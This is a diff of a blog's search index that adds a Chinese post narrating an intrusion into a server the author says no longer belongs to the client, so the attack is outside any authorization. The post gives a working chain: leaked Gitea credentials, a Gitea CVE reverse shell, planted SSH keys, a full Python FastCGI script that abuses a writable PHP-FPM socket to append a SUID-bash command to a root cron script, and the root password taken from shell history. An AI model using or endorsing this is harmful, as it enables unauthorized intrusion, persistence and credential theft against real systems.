@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>记一次曲折的渗透测试经历</title>
+      <link href="/post/a95b2346.html"/>
+      <url>/post/a95b2346.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>最初在完成一次客户交代的渗透测试任务时，偶然发现那么一个站点，里面的内容不是那么的“健康”。和客户沟通得知，该站点早已废弃，无论是域名还是服务器已均与客户无关。</p><h2 id="前期打点"><a href="#前期打点" class="headerlink" title="前期打点"></a>前期打点</h2><p>本来在日常测试中，要是打偏了也就收手了不浪费时间，更何况还是个 404。<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203584-1.jpg"></p><p>但是在对其进行前期信息收集时发现，存在 git 源码泄露！本着来都来了，看一眼再走也不亏<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203585.jpg"></p><p>除了本身的源码，其中&#x2F; <code>.git/config</code> 泄露了更有意思的东西：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/2ef961987f6a43322d16155e8f597614_MD5.jpg"></p><p>哇，居然是 gitea 仓库的账密，直接访问目标登录：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203587-1.jpg"></p><p>成功登录，而且还是后台管理员！可以审计代码，但是站点实际部署源码和 gitea 中又有些出入，没有成功直接 getshell，看来只能止步于此了……</p><p>真的只能止步于此了吗???</p><h2 id="初步立足-git-shell"><a href="#初步立足-git-shell" class="headerlink" title="初步立足(git shell)"></a>初步立足(git shell)</h2><p>我开始也确实没有更多思路了，将这个站点搁置了好一阵子，直到最近新爆出来了个 gitea 的漏洞：<a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m">CVE-2026-60004</a></p><p>只有拥有 gitea 账号，并且 gitea 版本低于 1.27.1 即可，该站点完美符合条件，由此拿下反弹 shell：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203586.jpg"></p><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203587.jpg"></p><p>虽然脚本会执行报错（因为没有回显超时了），但是命令已经成功执行，获取初始立足点。</p><p>写入 ssh 公钥，获取更稳定的 shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;your_public_key_type&gt; &lt;your_public_key&gt;&quot; &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>成功写入了 authorized_keys 还没完，还有第二关，ssh 监听端口并不是默认的 22</p><p>但是我们不是 root，没有权限直接去查看 ssh 的配置信息，但可以从另外的角度来推测，查看端口监听情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tlnup</span><br></pre></td></tr></table></figure><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203589.jpg"></p><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203588.jpg"></p><p>经过测试，19908 是 ssh 的监听端口，用用户名和密钥连上 SSH，至此获取到了 git 用户的稳定 shell ！</p><h2 id="权限提升-root-shell"><a href="#权限提升-root-shell" class="headerlink" title="权限提升(root shell)"></a>权限提升(root shell)</h2><p>然后就该尝试提权了，这里算是卡的最久的一部分了。<br>最近不是爆出来挺多 linux 提权 CVE 嘛，肯定首先先是想到拿新 CVE 打，发现打不通，这时再回看系统信息：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203588-1.jpg"></p><p>好家伙，3.10 版本内核的老古董了，2026 系列的新内核 CVE 是基本上没戏了。<br>转头看看老版本的大杀器 CVE-2016-5195 ，但是很遗憾，系统修复了，同样的 Pwnkit、Baron Samedit 也都被打了补丁。</p><p>各类像是 SUID，系统计划任务等常规提权手段，包括用 PEASS-ng 和 LinEnum 进行相关扫描，要么是没权限修改，要么被打了补丁，很长一段时间一筹莫展……第一次发现不升级系统居然反而更安全了……</p><p>想着这个站都是 vibe coding 来的，不应该没什么疏漏，于是打开了 pspy 监听进程，期待有什么新发现……</p><p>事实上，真的让我发现新东西了：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203584.jpg"></p><p>以 root 权限执行的 shell 脚本和 python 脚本，而且经过观察发现是每隔一段时间就会自动执行一次的。<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203583.jpg"></p><p>有些可惜的是，我们需要 www 权限才能对他修改，我们能否横向到 www 用户呢？<br>这里我开始的想法是，这是宝塔面板托管的站，我们 git 用户可以读取站点源码，代码审计后直接进行侧方打击，直取 www 用户：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203582.jpg"></p><p>但是很遗憾，这些站点源码都比较简陋，但正好是因为简陋，反而找不到什么攻击点了……</p><p>正在一筹莫展之际，在 AI 的提示下，发现了全局可写的 PHP-FPM Unix Socket，且存在 SUID 标志位：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203582.png"></p><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203581.png"></p><p>那么就可以通过劫持 PHP-FPM Unix Socket，向 PHP-FPM 发送 FastCGI 请求，以 www 用户身份执行 php 代码。<br>不过经过测试，存在 disable_functions：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,</span><br><span class="line">popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,</span><br><span class="line">openlog,syslog,readlink,symlink,popepassthru,</span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,</span><br><span class="line">pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,</span><br><span class="line">pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,...</span><br></pre></td></tr></table></figure><p>但是无所谓，能追加写入文件便已经足够了，直接给 <code>key_检查关键词是否为空.sh</code> 追加一条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootbash &amp;&amp; <span class="built_in">chmod</span> u+s /tmp/rootbash &amp;&amp; <span class="built_in">echo</span> <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>执行脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line"></span><br><span class="line">SOCK = <span class="string">&quot;/tmp/php-cgi-72.sock&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fcgi_req</span>(<span class="params">script_file_path, doc_root</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过 Unix Socket 向 PHP-FPM 发送 FastCGI 请求并返回解析后的响应&quot;&quot;&quot;</span></span><br><span class="line">    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">5</span>)</span><br><span class="line">    sock.connect(SOCK)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">b&quot;SCRIPT_FILENAME&quot;</span>: script_file_path.encode(),</span><br><span class="line">        <span class="string">b&quot;SCRIPT_NAME&quot;</span>: <span class="string">b&quot;/x.php&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;REQUEST_METHOD&quot;</span>: <span class="string">b&quot;GET&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;QUERY_STRING&quot;</span>: <span class="string">b&quot;&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;REQUEST_URI&quot;</span>: <span class="string">b&quot;/x.php&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;DOCUMENT_ROOT&quot;</span>: doc_root.encode(),</span><br><span class="line">        <span class="string">b&quot;SERVER_PROTOCOL&quot;</span>: <span class="string">b&quot;HTTP/1.1&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;SERVER_SOFTWARE&quot;</span>: <span class="string">b&quot;nginx&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;REMOTE_ADDR&quot;</span>: <span class="string">b&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;SERVER_NAME&quot;</span>: <span class="string">b&quot;x&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;REDIRECT_STATUS&quot;</span>: <span class="string">b&quot;200&quot;</span>,</span><br><span class="line">        <span class="string">b&quot;HTTP_HOST&quot;</span>: <span class="string">b&quot;x&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. FCGI_BEGIN_REQUEST (type=1, role=RESPONDER)</span></span><br><span class="line">    begin_request = <span class="string">b&quot;\x01\x01\x00\x01\x00\x08\x00\x00&quot;</span></span><br><span class="line">    begin_request += <span class="string">b&quot;\x00\x01\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 构造 FCGI_PARAMS</span></span><br><span class="line">    param_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> params.items():</span><br><span class="line">        <span class="comment"># Key 长度编码 (1字节 or 4字节)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(k) &lt; <span class="number">128</span>:</span><br><span class="line">            param_data += <span class="built_in">bytes</span>([<span class="built_in">len</span>(k)])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param_data += <span class="built_in">bytes</span>([<span class="number">0x80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]) + <span class="built_in">len</span>(k).to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">        <span class="comment"># Value 长度编码 (1字节 or 4字节)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(v) &lt; <span class="number">128</span>:</span><br><span class="line">            param_data += <span class="built_in">bytes</span>([<span class="built_in">len</span>(v)])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param_data += <span class="built_in">bytes</span>([<span class="number">0x80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]) + <span class="built_in">len</span>(v).to_bytes(<span class="number">4</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">        param_data += k + v</span><br><span class="line"></span><br><span class="line">    params_packet  = <span class="string">b&quot;\x01\x04\x00\x01&quot;</span> + <span class="built_in">len</span>(param_data).to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>) + <span class="string">b&quot;\x08\x00&quot;</span> + param_data</span><br><span class="line">    params_end     = <span class="string">b&quot;\x01\x04\x00\x01\x00\x00\x00\x00&quot;</span>   <span class="comment"># 空 PARAMS 表示结束</span></span><br><span class="line">    stdin_end      = <span class="string">b&quot;\x01\x05\x00\x01\x00\x00\x00\x00&quot;</span>   <span class="comment"># 空 STDIN 表示结束</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 发送请求</span></span><br><span class="line">    sock.send(begin_request + params_packet + params_end + stdin_end)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 接收响应</span></span><br><span class="line">    response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 解析 FCGI 响应帧 (提取 FCGI_STDOUT 内容)</span></span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; <span class="built_in">len</span>(response):</span><br><span class="line">        <span class="keyword">if</span> pos + <span class="number">8</span> &gt; <span class="built_in">len</span>(response):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fcgi_type       = response[pos + <span class="number">1</span>]</span><br><span class="line">        content_length  = <span class="built_in">int</span>.from_bytes(response[pos+<span class="number">4</span>:pos+<span class="number">6</span>], <span class="string">&quot;big&quot;</span>)</span><br><span class="line">        padding_length  = response[pos+<span class="number">6</span>]</span><br><span class="line">        pos += <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> fcgi_type == <span class="number">6</span>:      <span class="comment"># FCGI_STDOUT</span></span><br><span class="line">            result += response[pos:pos+content_length]</span><br><span class="line">        <span class="keyword">elif</span> fcgi_type == <span class="number">3</span>:    <span class="comment"># FCGI_END_REQUEST</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pos += content_length + padding_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- 攻击执行 ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: 写入 PHP payload 到 /dev/shm (git 用户可写)</span></span><br><span class="line">payload = <span class="string">&#x27;&lt;?php $f=&quot;/www/wwwroot/xxx/site1_5/data/key_检查关键词是否为空.sh&quot;;file_put_contents($f,&quot;\ncp /bin/bash /tmp/rootbash &amp;&amp; chmod u+s /tmp/rootbash &amp;&amp; echo done\n&quot;,FILE_APPEND);echo &quot;OK&quot;;?&gt;&#x27;</span></span><br><span class="line">tmp_file = <span class="string">&quot;/dev/shm/suid_payload.php&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(tmp_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 通过 PHP-FPM (www 用户) 执行 PHP 脚本</span></span><br><span class="line">result = fcgi_req(tmp_file, <span class="string">&quot;/dev/shm&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 清理</span></span><br><span class="line">os.unlink(tmp_file)</span><br></pre></td></tr></table></figure><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203580.png"></p><p>成功追加，等待一会，获得 rootbash：<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203579.png"></p><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203578-1.png"></p><p>给 root 的 ssh 也写个公钥，就可以持续稳定的连接啦~<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/file-20260810123203578.png"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>然后翻 bash_history 发现了 root 的密码<br><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/b6bd35215b370f80541d14e39c86b7bd_MD5.jpg"></p><p><img src="/./../post_img/9c4d46c2c080d2b5eb8c1781c8ea6d1b/91ad1a75b018f5161d2ebb9bfc6e3b79_MD5.jpg"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MazeSec靶机-Merge-WriteUp</title>
       <link href="/post/faa12633.html"/>
       <url>/post/faa12633.html</url>
@@ -22,9 +47,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 渗透测试 </tag>
-            
             <tag> MazeSec </tag>
+            
+            <tag> 渗透测试 </tag>
             
         </tags>
       
@@ -51,9 +76,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 渗透测试 </tag>
-            
             <tag> MazeSec </tag>
+            
+            <tag> 渗透测试 </tag>
             
         </tags>
       
@@ -711,13 +736,13 @@
       
         <tags>
             
-            <tag> 教程 </tag>
-            
             <tag> 内网穿透 </tag>
             
             <tag> frp </tag>
             
             <tag> proxifier </tag>
+            
+            <tag> 教程 </tag>
             
         </tags>
       
@@ -771,9 +796,9 @@
       
         <tags>
             
-            <tag> linux </tag>
-            
             <tag> 教程 </tag>
+            
+            <tag> linux </tag>
             
             <tag> 安装 </tag>
             
@@ -802,11 +827,11 @@
       
         <tags>
             
+            <tag> 教程 </tag>
+            
             <tag> kali </tag>
             
             <tag> linux </tag>
-            
-            <tag> 教程 </tag>
             
             <tag> 安装 </tag>
             
@@ -833,13 +858,13 @@
       
         <tags>
             
+            <tag> CISCN </tag>
+            
             <tag> WriteUp </tag>
             
             <tag> 网络安全 </tag>
             
             <tag> CTF </tag>
-            
-            <tag> CISCN </tag>
             
             <tag> web </tag>
             
@@ -866,13 +891,13 @@
       
         <tags>
             
+            <tag> CISCN </tag>
+            
             <tag> WriteUp </tag>
             
             <tag> 网络安全 </tag>
             
             <tag> CTF </tag>
-            
-            <tag> CISCN </tag>
             
             <tag> web </tag>
             
@@ -967,9 +992,9 @@
             
             <tag> CTF </tag>
             
-            <tag> web </tag>
-            
             <tag> BaseCTF </tag>
+            
+            <tag> web </tag>
             
         </tags>
       
